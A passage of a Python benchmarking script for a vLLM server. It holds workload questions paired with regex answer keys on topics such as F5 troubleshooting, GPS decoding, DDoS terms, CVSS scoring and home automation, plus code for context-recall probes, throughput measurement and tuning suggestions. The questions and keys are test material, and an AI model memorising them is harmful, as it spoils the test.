     r"(?=.*when\s+HTTP_REQUEST)(?=.*HTTP::redirect)(?=.*prepare)"),
    ("Code: MongoDB/ClickHouse/Qdrant/Arcade",
     "Give one short query for each: 1) MongoDB aggregation summing order totals per customerId, highest first. "
     "2) ClickHouse SQL counting events per hour for the last 24 hours. "
     "3) A Qdrant REST search request body with a payload filter on field 'tenant' = 'acme'. "
     "4) ArcadeDB SQL returning the names of vertices a Person vertex follows via 'Follows' edges.",
     r"(?=.*\$group)(?=.*(toStartOfHour|toStartOfInterval|toHour))(?=.*filter)(?=.*(out\(|traverse|match))"),

    # ── 4. GPS ───────────────────────────────────────────────────────────────
    ("GPS: NMEA decode",
     "Decode this NMEA sentence: $GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47 . "
     "Give the latitude and longitude in decimal degrees, the fix quality, number of satellites and altitude, "
     "and explain in one sentence how GNSS differs from GPS.",
     r"(?=.*48\.117)(?=.*11\.51)(?=.*\b0?8\b)(?=.*545)"),
    ("GPS: distance",
     "Roughly how far apart are New York (40.7128, -74.0060) and London (51.5074, -0.1278) along the Earth's "
     "surface? Name the formula you would use and give the answer in km.",
     r"(?=.*(haversine|great.circle))(?=.*(5,?5\d\d|5,?6\d\d))"),

    # ── 5. F5 Networks ───────────────────────────────────────────────────────
    ("F5: pool member down",
     "A BIG-IP pool member is marked down by its HTTP monitor, but curl from the BIG-IP shell to the same "
     "IP:port returns 200 OK. Give a prioritized troubleshooting checklist with the tmsh commands you would run.",
     r"(?=.*tmsh)(?=.*monitor)(?=.*(send|receive|recv|route.?domain|self ?ip|tcpdump))"),
    ("F5: SNAT / asymmetric return",
     "Clients can reach a BIG-IP virtual server but connections hang after the SYN. The pool members' default "
     "gateway is not the BIG-IP. Explain the cause and the fix.",
     r"(?=.*(asymmetric|return traffic|bypass|directly))(?=.*(SNAT|automap|source address translation))"),
    ("F5: tmsh commands",
     "Give the tmsh commands to: list pool members with their status, save the running configuration, show "
     "connection table entries, and check the HA failover state.",
     r"(?=.*show ltm pool)(?=.*save sys config)(?=.*show sys connection)(?=.*failover)"),

    # ── 6. Audio / meeting transcription ─────────────────────────────────────
    ("Meeting: summary & actions",
     "Summarize this meeting transcript in 3 bullets, then list the decisions and action items with owners "
     f"and due dates:\n\n{MEETING_TRANSCRIPT}",
     r"(?=.*Marcus)(?=.*Priya)(?=.*Dana)(?=.*Friday)"),
    ("Meeting: fix ASR errors",
     "This is a raw speech-to-text transcript with misheard technical terms. Rewrite it cleanly with correct "
     f"terminology and punctuation, then list the terms you corrected:\n\n{NOISY_ASR}",
     r"(?=.*BGP)(?=.*RTBH)(?=.*UDP)(?=.*F5)(?=.*flow ?spec)"),

    # ── 7. Glossary lookups ──────────────────────────────────────────────────
    ("Glossary: BGP/RTBH/FlowSpec/UDP",
     "Define each in one or two sentences for a meeting glossary: BGP, RTBH, FlowSpec, UDP.",
     r"(?=.*border gateway)(?=.*black.?hol)(?=.*flow.?spec)(?=.*user datagram)"),
    ("Glossary: DDoS mitigation terms",
     "In a short bullet list: when would you choose RTBH vs FlowSpec vs a scrubbing center for a DDoS, "
     "and what are anycast and ECMP?",
     r"(?=.*(all traffic|entire|whole|victim|drop))(?=.*(match|granular|specific|port|surgical))(?=.*anycast)(?=.*(ecmp|equal.cost))"),

    # ── 8. Security research ─────────────────────────────────────────────────
    ("Research: CVSS vector",
     "Explain CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H in plain English, and give its base score and severity.",
     r"(?=.*9\.8)(?=.*critical)(?=.*(network|remote))"),
    ("Research: nmap output",
     "For my own lab host, this nmap -sV output came back. What stands out as risky and what would you check first?\n\n"
     "22/tcp   open     ssh     OpenSSH 7.2p2\n80/tcp   open     http    Apache httpd 2.4.49\n3306/tcp filtered mysql",
     r"(?=.*(41773|path traversal|2\.4\.49))(?=.*(filtered|firewall))"),
    ("Research: Wireshark filters",
     "Give Wireshark display filters for: a) TCP SYN packets without ACK, b) DNS traffic to or from 8.8.8.8, "
     "c) TLS ClientHello messages.",
     r"(?=.*tcp\.flags)(?=.*8\.8\.8\.8)(?=.*tls\.handshake\.type\s*==\s*1)"),

    # ── 9. Home automation ───────────────────────────────────────────────────
    ("Home: Zigbee -> MQTT -> HA",
     "Explain how a Zigbee door sensor's open/close event reaches Home Assistant through Zigbee2MQTT and MQTT "
     "(include an example topic and payload), and why Zigbee channels 15, 20 or 25 are often chosen next to a "
     "2.4 GHz Wi-Fi network.",
     r"(?=.*(coordinator|zigbee2mqtt))(?=.*topic)(?=.*(channel|interfer|overlap))"),
    ("Home: MQTT QoS / retain / LWT",
     "Explain MQTT QoS levels 0, 1 and 2, retained messages, and Last Will and Testament, with a smart-home "
     "example for each.",
     r"(?=.*qos)(?=.*retain)(?=.*(last will|LWT))"),
    ("Home: Zigbee vs Z-Wave vs Thread vs Wi-Fi",
     "For battery-powered door and temperature sensors, compare Zigbee, Z-Wave, Thread/Matter and Wi-Fi on "
     "mesh networking, power use and range, and recommend one.",
     r"(?=.*mesh)(?=.*(battery|power))(?=.*(Thread|Matter))(?=.*Wi-?Fi)"),
]

LONG_PROMPT_LABEL = "Long-prompt prefill"


def build_long_prompt(target_tokens: int) -> str:
    """Synthetic firewall log, ~target_tokens long, unique per call so nothing is cache-reusable."""
    rnd = random.Random(time.time_ns())
    lines = []
    for i in range(max(1, target_tokens // 30)):
        lines.append(
            f"[{i:05d}] fw-{rnd.randint(1, 40)} DENY tcp 10.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}"
            f":{rnd.randint(1024, 65535)} -> 192.168.{rnd.randint(0, 20)}.{rnd.randint(1, 254)}:{rnd.choice([22, 80, 443, 3389, 8080])}"
            f" rule={rnd.randint(100, 999)} bytes={rnd.randint(40, 9000)}"
        )
    return (
        "Here is a firewall log excerpt. In 4 sentences, summarize the most notable patterns "
        "(top destination ports, any scanning behavior) and say what you would investigate first.\n\n"
        + "\n".join(lines)
    )


CONTEXT_TEST_LABEL = "Context: recall near limit"


def build_context_probe(target_tokens: int) -> tuple[str, str]:
    """A haystack prompt sized to ~target_tokens with a unique code planted near the START, used to check
    whether a server's reported max context is both ACCEPTED (doesn't error) and actually usable (the model
    can still recall content from near the beginning of a nearly-full context, not just avoid crashing).
    Returns (prompt, expected_regex). The size is only an estimate (~4 chars/token, like elsewhere in this
    script) — the server's own reported prompt_n after the request is what actually confirms the real size.
    """
    rnd = random.Random(time.time_ns())
    code = "".join(rnd.choices(string.ascii_uppercase + string.digits, k=8))
    needle = f"The one-time verification code for this session is {code}. Remember it; you will be asked for it later.\n\n"
    filler_unit = (
        "The quarterly network maintenance window is scheduled, and all non-critical changes are deferred "
        "until engineering confirms the rollback plan is tested and the on-call rotation has signed off on "
        "the deployment checklist. "
    )
    question = (
        "\n\nQuestion: what was the one-time verification code given at the very start of this message? "
        "Reply with ONLY the code, nothing else."
    )
    # Leave room for the needle and question text themselves; the rest is filler.
    target_chars = max(0, target_tokens * 4 - len(needle) - len(question))
    reps = max(1, target_chars // len(filler_unit))
    return needle + (filler_unit * reps) + question, re.escape(code)


# ─────────────────────────────────────────────────────────────────────────────
# Context size — vLLM reports max_model_len per model on /v1/models; llama.cpp
# (or anything else OpenAI-compatible fronted by it) reports n_ctx on /props.
# ─────────────────────────────────────────────────────────────────────────────
def get_model_info(base_url: str) -> tuple[str, Optional[int], str]:
    """(first model id, max context tokens, where the context figure came from)."""
    model, ctx, source = "", None, ""
    try:
        data = json.loads(http_get(f"{base_url}/v1/models", timeout=10) or "{}").get("data") or []
    except ValueError:
        data = []
    if data:
        model = data[0].get("id", "")
        for key in ("max_model_len", "context_length", "max_context_length"):
            if isinstance(data[0].get(key), int):
                ctx, source = data[0][key], f"/v1/models {key}"
                break
    if ctx is None:
        try:
            props = json.loads(http_get(f"{base_url}/props", timeout=5) or "{}")
            n_ctx = (props.get("default_generation_settings") or {}).get("n_ctx")
            if isinstance(n_ctx, int):
                ctx, source = n_ctx, "/props n_ctx (per slot)"
        except ValueError:
            pass
    return model, ctx, source


def fmt_ctx(ctx: Optional[int]) -> str:
    if not ctx:
        return "unknown"
    return f"{ctx:,} tokens" + (f" ({ctx // 1024}K)" if ctx >= 1024 and ctx % 1024 == 0 else "")


# ─────────────────────────────────────────────────────────────────────────────
# vLLM Prometheus metrics — read before and after an instance's tests so the
# suggestions can tell whether *this run* caused KV-cache preemptions.
# ─────────────────────────────────────────────────────────────────────────────
def vllm_metrics(base_url: str) -> dict[str, float]:
    text = http_get(f"{base_url}/metrics", timeout=5) or ""
    totals: dict[str, float] = {}
    for line in text.splitlines():
        if line.startswith("#"):
            continue
        m = re.match(r"(vllm:[a-z_]+)(?:\{[^}]*\})?\s+([-+0-9.eE]+|NaN)$", line.strip())
        if not m or m.group(2) == "NaN":
            continue
        totals[m.group(1)] = totals.get(m.group(1), 0.0) + float(m.group(2))
    return totals


# ─────────────────────────────────────────────────────────────────────────────
# Workload suite — the question set from tester_llamacpp.py (keep the two in
# sync), sent streamed so each answer gets time-to-first-token and decode speed.
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class WorkloadResult:
    label: str
    content: str = ""
    reasoning: str = ""
    finish: str = ""
    prompt_n: int = 0
    completion_n: int = 0
    wall_s: float = 0.0
    ttft_s: Optional[float] = None
    decode_tps: Optional[float] = None
    error: str = ""
    ok: bool = False
    accurate: Optional[bool] = None


def run_workload_question(base_url: str, model: str, label: str, prompt: str, expect: Optional[str],
                          max_tokens: int, no_cache: bool) -> WorkloadResult:
    res = WorkloadResult(label=label)
    body = _apply_thinking({
        "model": model,
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": max_tokens,
        "temperature": 0.2,
        "stream": True,
        "stream_options": {"include_usage": True},
    })
    if no_cache:
        body["cache_prompt"] = False  # llama.cpp only; vLLM ignores it (see suggestions)
    req = urllib.request.Request(
        f"{base_url}/v1/chat/completions", data=json.dumps(body).encode(), headers=_headers(True), method="POST"
    )
    content, reasoning = [], []
    usage, timings, deltas = {}, {}, 0
    first = None
    start = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=900) as r:
            for raw in r:
                line = raw.decode("utf-8", "replace").strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if payload == "[DONE]":
                    break
                try:
                    chunk = json.loads(payload)
                except ValueError:
                    continue
                usage = chunk.get("usage") or usage
                timings = chunk.get("timings") or timings
                for ch in chunk.get("choices") or []:
                    d = ch.get("delta") or {}
                    c = d.get("content")
                    rs = d.get("reasoning_content") or d.get("reasoning")
                    if (c or rs) and first is None:
                        first = time.perf_counter()
                    if c:
                        content.append(c)
                    if rs:
                        reasoning.append(rs)
                    if c or rs:
                        deltas += 1
                    if ch.get("finish_reason"):
                        res.finish = ch["finish_reason"]
    except urllib.error.HTTPError as e:
        res.error = f"HTTP {e.code}: {e.read().decode('utf-8', 'replace')[:200]}"
    except Exception as e:
        res.error = str(e) or type(e).__name__
    end = time.perf_counter()

    res.wall_s = end - start
    res.content = "".join(content).strip()
    res.reasoning = "".join(reasoning).strip()
    res.prompt_n = usage.get("prompt_tokens") or timings.get("prompt_n") or 0
    # Without usage (old server, or a proxy that drops stream_options) each
    # streamed delta is roughly one token — close enough for a rate.
    res.completion_n = usage.get("completion_tokens") or timings.get("predicted_n") or deltas
    if first is not None:
        res.ttft_s = first - start
        decode_s = end - first
        res.decode_tps = timings.get("predicted_per_second") or (
            (res.completion_n - 1) / decode_s if res.completion_n > 1 and decode_s > 0 else None
        )
    if not res.error:
        THROUGHPUT.add(
            TpsSample(label, res.completion_n, res.wall_s, res.ttft_s, res.decode_tps),
            finish=res.finish, content=res.content, reasoning=res.reasoning,
        )
    res.ok = bool(res.content)
    if expect and res.ok:
        res.accurate = bool(re.search(expect, res.content, re.IGNORECASE | re.DOTALL))
    return res


def build_workload_jobs(args: argparse.Namespace, ctx: Optional[int]) -> list[tuple]:
    if args.no_workloads:
        return []
    wanted = [w.strip().lower() for w in args.only.split(",") if w.strip()]
    jobs = [q for q in QUESTIONS if not wanted or any(w in q[0].lower() for w in wanted)]
    if args.long_prompt:
        jobs.append((f"{LONG_PROMPT_LABEL} (~{args.long_prompt} tok)", build_long_prompt(args.long_prompt), None))
    if args.context_test and ctx:
        target = max(256, int(ctx * args.context_test_fraction))
        probe_prompt, probe_pattern = build_context_probe(target)
        jobs.append((f"{CONTEXT_TEST_LABEL} (~{target:,} of {ctx:,} tok)", probe_prompt, probe_pattern))
    return jobs


def run_workload_suite(base_url: str, model: str, ctx: Optional[int], jobs: list[tuple], args: argparse.Namespace,
                       quality: QualityTracker, result: InstanceResult, color: str, step) -> None:
    global CURRENT_LABEL
    total = len(jobs)
    section(f"38. Workload suite  ({total} questions from tester_llamacpp.py)", color)
    cinfo(
        f"Thinking: {'server default' if THINKING is None else ('ON' if THINKING else 'OFF')}  |  "
        f"max_tokens={args.max_tokens}  |  concurrency={args.concurrency}"
    )
    if args.context_test and not ctx:
        cwarn("--context-test skipped: the server didn't report its max context")

    def do(job) -> WorkloadResult:
        force = job[0].startswith(LONG_PROMPT_LABEL) or job[0].startswith(CONTEXT_TEST_LABEL)
        return run_workload_question(base_url, model, job[0], job[1], job[2], args.max_tokens, args.no_cache or force)

    def show(i: int, job, r: WorkloadResult) -> None:
        cat, prompt, _ = job
        console.print()
        console.print(Rule(f"[bold {color}]38.{i}/{total}  {cat}[/bold {color}]", style=color, align="left"))
        shown = prompt if len(prompt) <= 600 else prompt[:600] + f"... [{len(prompt):,} chars total]"
        console.print(f"[bold]Q:[/bold] {shown}")
        if r.error:
            cfail(r.error)
            if cat.startswith(CONTEXT_TEST_LABEL):
                console.print(f"[bold red][CONTEXT][/bold red] the server REJECTED this request — the usable "
                              f"context is smaller than the reported {fmt_ctx(ctx)}")
            return
        if r.reasoning:
            snippet = r.reasoning.replace("\n", " ")
            console.print(f"[dim]thinking ({len(r.reasoning):,} chars): {snippet[:300]}{'…' if len(snippet) > 300 else ''}[/dim]")
        body = r.content or "[dim](empty)[/dim]"
        if not args.full_responses and len(body) > 2500:
            body = body[:2500] + f"\n… [{len(r.content):,} chars total — use --full-responses to see all]"
        console.print(Panel(body, title="Response", border_style="green" if r.ok else "red"))
        if not r.ok:
            why = " (ran out of tokens while thinking — raise --max-tokens)" if r.finish == "length" else ""
            cfail(f"no content returned{why}")
        elif r.accurate is True:
            cpass("expected answer pattern found")
        elif r.accurate is False:
            cwarn("content returned, but the expected answer pattern wasn't found")
        else:
            cpass("returned content (no answer key for this one)")
        ttft = f"{r.ttft_s:.2f}s" if r.ttft_s is not None else "n/a"
        dec = f"{r.decode_tps:.1f}" if r.decode_tps else "n/a"
        e2e = f"{r.completion_n / r.wall_s:.1f}" if r.wall_s and r.completion_n else "n/a"
        cinfo(f"prompt={r.prompt_n} tok  gen={r.completion_n} tok  TTFT={ttft}  decode={dec} t/s  "
              f"end-to-end={e2e} t/s  wall={r.wall_s:.2f}s  finish={r.finish or 'n/a'}")
        if cat.startswith(CONTEXT_TEST_LABEL) and ctx:
            pct = 100 * r.prompt_n / ctx if r.prompt_n else 0
            recall = "RECALLED correctly" if r.accurate else "NOT recalled" if r.accurate is False else "not checked"
            vcolor = "green" if r.accurate else "red"
            console.print(f"[bold {vcolor}][CONTEXT][/bold {vcolor}] server accepted {r.prompt_n:,} tokens "
                          f"({pct:.0f}% of {ctx:,}) — the code planted near the start was {recall}")

    results: list[WorkloadResult] = []
    if args.concurrency <= 1:
        for i, job in enumerate(jobs, 1):
            CURRENT_LABEL = job[0]
            r = do(job)
            results.append(r)
            show(i, job, r)
            step()
    else:
        cinfo(f"Sending {total} requests, {args.concurrency} at a time...")
        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
            results = list(ex.map(do, jobs))
        for i, (job, r) in enumerate(zip(jobs, results), 1):
            show(i, job, r)
            step()

    t = Table(box=box.SIMPLE_HEAVY, title=f"Workload summary — {model}")
    for col, just in [("#", "right"), ("Question", "left"), ("Result", "left"), ("Prompt tok", "right"),
                      ("Gen tok", "right"), ("TTFT s", "right"), ("Decode t/s", "right"), ("Wall s", "right")]:
        t.add_column(col, justify=just)
    for i, (job, r) in enumerate(zip(jobs, results), 1):
        if r.error:
            verdict = "[red]ERROR[/red]"
        elif not r.ok:
            verdict = "[red]EMPTY[/red]"
        elif r.accurate is None:
            verdict = "[green]answered[/green]"
        else:
            verdict = "[green]correct[/green]" if r.accurate else "[yellow]check[/yellow]"
        t.add_row(str(i), job[0], verdict, str(r.prompt_n), str(r.completion_n),
                  f"{r.ttft_s:.2f}" if r.ttft_s is not None else "-",
                  f"{r.decode_tps:.1f}" if r.decode_tps else "-", f"{r.wall_s:.1f}")
    console.print(t)

    checked = [r for r in results if r.accurate is not None]
    result.workload_checked = len(checked)
    result.workload_ok = sum(1 for r in checked if r.accurate)
    quality.total += len(checked)
    quality.passed += result.workload_ok
    answered = sum(1 for r in results if r.ok)
    cinfo(f"Workloads: {answered}/{total} answered, {result.workload_ok}/{len(checked)} matched the answer key")

    for job, r in zip(jobs, results):
        if job[0].startswith(CONTEXT_TEST_LABEL):
            if r.error:
                result.suggestions.append(
                    f"The context test was rejected at {job[0]} — lower vLLM's --max-model-len to what the KV cache "
                    "can actually hold, or raise --gpu-memory-utilization so the advertised context is real."
                )
            elif r.accurate is False:
                result.suggestions.append(
                    "The context test was accepted but the planted code wasn't recalled — the model doesn't use its "
                    "full advertised context reliably; keep production prompts well under it."
                )


# ─────────────────────────────────────────────────────────────────────────────
# Suggestions — derived from what this run actually observed, so the next run
# (and the server config) can be tuned instead of guessed at.
# ─────────────────────────────────────────────────────────────────────────────
def instance_suggestions(base_url: str, ctx: Optional[int], st: Optional[dict], args: argparse.Namespace,
                         metrics_before: dict, metrics_after: dict, n_workloads: int) -> list[str]:
    out: list[str] = []
    with THROUGHPUT.lock:
        truncated = list(dict.fromkeys(THROUGHPUT.truncated))
        reasoning_only = list(dict.fromkeys(THROUGHPUT.reasoning_only))

    if truncated:
        out.append(
            f"{len(truncated)} answer(s) hit max_tokens (finish_reason=length): {', '.join(truncated[:5])}"
            f"{' …' if len(truncated) > 5 else ''}. Raise --max-tokens (workload suite, now {args.max_tokens}); "
            "the quick graded tests 10-30 use a fixed 1024-token budget."
        )
    if reasoning_only:
        hint = ("pass --thinking off to grade answers rather than reasoning, or --thinking on with a larger "
                "--max-tokens" if THINKING is None else "raise --max-tokens")
        out.append(
            f"{len(reasoning_only)} answer(s) spent the whole budget thinking and returned no content "
            f"({', '.join(reasoning_only[:3])}{' …' if len(reasoning_only) > 3 else ''}) — {hint}."
        )

    if not ctx:
        out.append(f"{base_url} didn't report its context size — start vLLM with an explicit --max-model-len.")
    elif ctx < 16384:
        out.append(
            f"Context is only {fmt_ctx(ctx)} — long-context and RAG workloads will be truncated; raise vLLM's "
            "--max-model-len if the model and KV-cache memory allow it."
        )
    if ctx and not args.context_test and n_workloads:
        out.append(f"Add --context-test to verify the advertised {fmt_ctx(ctx)} is really usable (accepted AND recalled).")
    if not args.long_prompt and n_workloads:
        out.append("Add --long-prompt 8000 so prompt-processing (prefill) speed is measured on a realistic input, "
                   "not just short questions.")
    if args.concurrency <= 1 and n_workloads:
        out.append("Add --concurrency 4 (or your expected users) — vLLM's continuous batching is its main advantage, "
                   "and single-request runs don't show aggregate throughput or contention.")
    if args.no_cache:
        out.append("--no-cache only affects llama.cpp; vLLM prefix caching is server-wide — restart with "
                   "--no-enable-prefix-caching for cold-prefill numbers (the long-prompt and context tests are "
                   "randomized and never hit the cache anyway).")

    if st:
        if st["min"] > 0 and st["max"] / st["min"] > 3:
            out.append(
                f"Tokens/s varied {st['max'] / st['min']:.1f}x between answers ({st['min']:.1f}–{st['max']:.1f}). "
                "Short answers are dominated by prefill/overhead; if decode speed also varies, another model or "
                "process is sharing the GPU — stop it, or re-run to confirm."
            )
        if st["first_ttft"] and st["ttft_avg"] and st["first_ttft"] > 5 and st["first_ttft"] > 3 * st["ttft_avg"]:
            out.append(
                f"First streamed answer took {st['first_ttft']:.1f}s to start vs {st['ttft_avg']:.2f}s on average — "
                "likely a cold start (sleep mode / CUDA graph capture / compile); keep the server warm before benchmarking."
            )

    if metrics_after:
        pre = metrics_after.get("vllm:num_preemptions_total", 0) - metrics_before.get("vllm:num_preemptions_total", 0)
        if pre > 0:
            out.append(
                f"vLLM preempted {pre:.0f} request(s) during this run (KV cache ran out). Raise "
                "--gpu-memory-utilization, lower --max-num-seqs, or reduce --max-model-len."
            )
        kv = metrics_after.get("vllm:kv_cache_usage_perc", metrics_after.get("vllm:gpu_cache_usage_perc"))
        if kv is not None and kv > 0.9:
            out.append(f"KV cache is {kv:.0%} full right after the tests — there's little headroom for concurrent users.")
    else:
        out.append(f"{base_url}/metrics was not reachable — enable it to get KV-cache and preemption checks.")

    port = base_url.rsplit(":", 1)[-1]
    for ct in DISCOVERED_CONTAINERS:
        if port in {p for _, p in ct["targets"]}:
            if ct.get("ipc") != "host" and (ct.get("shm_size") or 0) < 8 * 1024 ** 3:
                shm = f"{(ct.get('shm_size') or 0) / 1024 ** 2:.0f}MB"
                out.append(
                    f"Container {ct['name']} runs with ipc={ct.get('ipc') or 'default'} and shm={shm}. vLLM uses "
                    "shared memory between its processes — start it with --ipc=host (or --shm-size=16g) to avoid "
                    "stalls and crashes under load."
                )
    return out


def print_suggestions(items: list[str], title: str = "Suggestions for future runs", color: str = "yellow") -> None:
    section(title, color)
    if not items:
        cpass("Nothing to tune — this run used the recommended options and hit no limits.")
        return
    for i, s in enumerate(items, 1):
        console.print(f"  [bold {color}]{i}.[/bold {color}] {s}")


# ─────────────────────────────────────────────────────────────────────────────
# Per-instance test suite
# ─────────────────────────────────────────────────────────────────────────────
def run_instance_tests(host: str, port: str, color: str, args: argparse.Namespace) -> InstanceResult:
    base_url = f"http://{host}:{port}"
    result = InstanceResult(base_url=base_url)
    start_time = time.perf_counter()
    quality = QualityTracker()
    THROUGHPUT.reset()

    info_model, ctx, ctx_source = get_model_info(base_url)
    result.context_len = ctx
    metrics_before = vllm_metrics(base_url)
    jobs = build_workload_jobs(args, ctx)

    console.print()
    header = f"Instance target: [bold]{base_url}[/bold]"
    if info_model:
        header += f"\nModel          : [bold]{info_model}[/bold]"
        header += f"\nContext size   : [bold]{fmt_ctx(ctx)}[/bold]" + (f"  [dim]({ctx_source})[/dim]" if ctx else "")
    console.print(Panel(header, style=color, box=box.DOUBLE))

    # auto_refresh is deliberately OFF: Progress normally repaints from a
    # background timer thread, and that thread racing against the heavy
    # interleaved console.print() calls below (panels, syntax blocks, tables)
    # intermittently corrupted output — lines would silently vanish. Manual,
    # synchronous refresh() calls (only right after we advance the bar, never
    # concurrently with anything else) avoid that race entirely.
    progress = Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(complete_style=color, finished_style=color),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
        auto_refresh=False,
    )

    with progress:
        total_steps = TOTAL_TEST_STEPS + len(jobs)
        task = progress.add_task(f"[{color}]Testing {base_url}", total=total_steps)
        progress.refresh()

        def step():
            progress.advance(task)
            progress.refresh()

        # ── 1. Reachability ─────────────────────────────────────────────────
        section("1. Reachability", color)
        reachable = False
        for path in ("", "/health", "/v1/models"):
            _, body = http_get_status(f"{base_url}{path}", timeout=5)
            if body is not None and http_get_status(f"{base_url}{path}", timeout=5)[0] is not None:
                reachable = True
                break
        status, _ = http_get_status(base_url, timeout=5)
        if status is None:
            status, _ = http_get_status(f"{base_url}/health", timeout=5)
        if status is None:
            status, _ = http_get_status(f"{base_url}/v1/models", timeout=5)
        reachable = status is not None
        if reachable:
            cpass(f"Host is reachable at {base_url}")
        else:
            cfail(f"Cannot reach {base_url}")
            console.print("  Hint: check that vLLM is running and the host/port are correct.")
            result.failures += 1
            result.reachable = False
            progress.update(task, completed=total_steps)
            progress.refresh()
            result.duration_s = time.perf_counter() - start_time
            return result
        step()

        # ── 2. Health check ─────────────────────────────────────────────────
        section("2. Health check  (GET /health)", color)
        health_code, health_body = http_get_status(f"{base_url}/health", timeout=10)
        if health_code == 200:
            cpass(f"Health endpoint responded: HTTP 200{' — ' + health_body if health_body else ''}")
        elif health_code is not None:
            cwarn(f"/health responded with HTTP {health_code} (may be unsupported on this version)")
        else:
            cwarn("/health returned no response (may be unsupported on this version)")
        step()

        # ── 3. Model list ────────────────────────────────────────────────────
        section("3. Model list  (GET /v1/models)", color)
        models_json = http_get(f"{base_url}/v1/models", timeout=10)
        first_model = ""
        if not models_json:
            cfail("No response from /v1/models")
            result.failures += 1
        else:
            try:
                data = json.loads(models_json)
                models = data.get("data", [])
            except Exception:
                models = []
            if not models:
                cwarn("Model list is empty")
                result.failures += 1
            else:
                cpass(f"Found {len(models)} model(s):")
                for m in models:
                    mctx = m.get("max_model_len")
                    console.print(
                        f"  • {m.get('id')}  (owned_by: {m.get('owned_by', 'n/a')}"
                        + (f", context: {mctx:,} tokens" if isinstance(mctx, int) else "") + ")"
                    )
                first_model = models[0].get("id", "")
                cinfo(f"Using model for tests: {first_model}")
        result.model = first_model or "(unknown)"
        step()

        # ── 3b. Capability detection ────────────────────────────────────────
        section("3b. Capability detection", color)
        cap_chat = False
        cap_embed = False
        if first_model:
            probe_body = {
                "model": first_model,
                "max_tokens": 1,
                "messages": [{"role": "user", "content": "hi"}],
            }
            probe_resp = http_post_json(f"{base_url}/v1/chat/completions", probe_body)
            if probe_resp:
                try:
                    cap_chat = bool(json.loads(probe_resp).get("choices"))
                except Exception:
                    cap_chat = False

            eprobe_body = {"model": first_model, "input": "probe"}
            eprobe_resp = http_post_json(f"{base_url}/v1/embeddings", eprobe_body)
            if eprobe_resp:
                try:
                    d = json.loads(eprobe_resp)
                    cap_embed = bool(d.get("data") and d["data"][0].get("embedding"))
                except Exception:
                    cap_embed = False

            if not cap_chat and not cap_embed:
                cwarn("Could not confirm chat or embeddings support via quick probe — will attempt chat tests anyway")
                cap_chat = True

            if cap_chat and cap_embed:
                cinfo("Model supports both chat/completions and embeddings")
            elif cap_chat:
                cinfo("Model supports chat/completions (no embeddings support detected) — tests 7 and 7b will be skipped")
            elif cap_embed:
                cinfo("Model supports embeddings only (embedding model) — chat-dependent tests will be skipped, not failed")
        else:
            cwarn("Skipping — no model discovered")
        result.cap_chat = cap_chat
        result.cap_embed = cap_embed
        step()

        # ── 4. Server info ──────────────────────────────────────────────────
        section("4. Server info", color)
        for path in ("/version", "/v1/version", "/info"):
            resp = http_get(f"{base_url}{path}", timeout=10)
            if resp:
                cpass(f"{path}: {resp}")
        step()

        # ── 5. Chat completion (fully skipped for embedding-only models) ────
        if first_model and cap_chat:
            section("5. Chat completion  (POST /v1/chat/completions)", color)
            chat_body = {
                "model": first_model,
                "max_tokens": 512,
                "temperature": 0.1,
                "messages": [
                    {"role": "system", "content": "You are a helpful assistant. Be concise."},
                    {
                        "role": "user",
                        "content": "What model are you and what are your key capabilities? "
                        "What is your training data cut off date. Answer in 3-4 sentences.",
                    },
                ],
            }
            chat_resp = http_post_json(f"{base_url}/v1/chat/completions", chat_body)
            if not chat_resp:
                cfail("No response from /v1/chat/completions")
                result.failures += 1
            else:
                chat_text = extract_message_text(chat_resp)
                try:
                    usage = json.loads(chat_resp).get("usage", {})
                    usage_s = (
                        f"prompt={usage.get('prompt_tokens')} "
                        f"completion={usage.get('completion_tokens')} "
                        f"total={usage.get('total_tokens')}"
                    )
                except Exception:
                    usage_s = ""
                if chat_text:
                    cpass("Chat completion succeeded")
                    console.print(f"  Response : {chat_text}")
                    console.print(f"  Tokens   : {usage_s}")
                else:
                    cfail("Chat response malformed")
                    console.print(f"  Raw: {chat_resp[:400]}")
                    result.failures += 1
        step()

        # ── 5b. Generation throughput ────────────────────────────────────────
        if first_model and cap_chat:
            section("5b. Generation throughput  (completion tokens/sec)", color)
            cinfo(f"Benchmarking model: {first_model}")
            cinfo("Metric: non-streaming completion_tokens / end-to-end request seconds")
            ok, total_completion, total_elapsed = 0, 0, 0.0
            for i in range(1, 3):
                body = {
                    "model": first_model,
                    "max_tokens": 192,
                    "temperature": 0,
                    "messages": [
                        {
                            "role": "user",
                            "content": "Write a dense technical paragraph about local AI inference "
                            "performance, batching, KV cache behavior, and latency. Continue until "
                            "you naturally reach the token budget.",
                        }
                    ],
                }
                t0 = time.perf_counter()
                resp = http_post_json(f"{base_url}/v1/chat/completions", body)
                elapsed = time.perf_counter() - t0
                if not resp:
                    cwarn(f"Throughput run {i}/2: no response")
                    continue
                try:
                    usage = json.loads(resp).get("usage", {})
                    completion_tokens = usage.get("completion_tokens", 0)
                    prompt_tokens = usage.get("prompt_tokens")
                    total_tokens = usage.get("total_tokens")
                except Exception:
                    completion_tokens = 0
                    prompt_tokens = total_tokens = None
                if not completion_tokens:
                    cwarn(f"Throughput run {i}/2: response did not include usage.completion_tokens")
                    continue
                tps = completion_tokens / elapsed if elapsed > 0 else 0
                extra = f"  (prompt={prompt_tokens} total={total_tokens})" if prompt_tokens else ""
                console.print(
                    f"  Run {i}/2 : {completion_tokens:4d} completion tokens in {elapsed:.2f}s"
                    f"  =>  {tps:.2f} tok/s{extra}"
                )
                ok += 1
                total_completion += completion_tokens
                total_elapsed += elapsed
            if ok:
                tps = total_completion / total_elapsed if total_elapsed > 0 else 0
                cpass(f"Average generation throughput: {tps:.2f} completion tokens/sec ({total_completion} tokens across {ok} run(s))")
            else:
                cwarn(f"Could not calculate throughput for {first_model}")
        step()

        # ── 6. Text completion ───────────────────────────────────────────────
        if first_model and cap_chat:
            section("6. Text completion  (POST /v1/completions)", color)
            comp_body = {"model": first_model, "prompt": "The capital of France is", "max_tokens": 20, "temperature": 0}
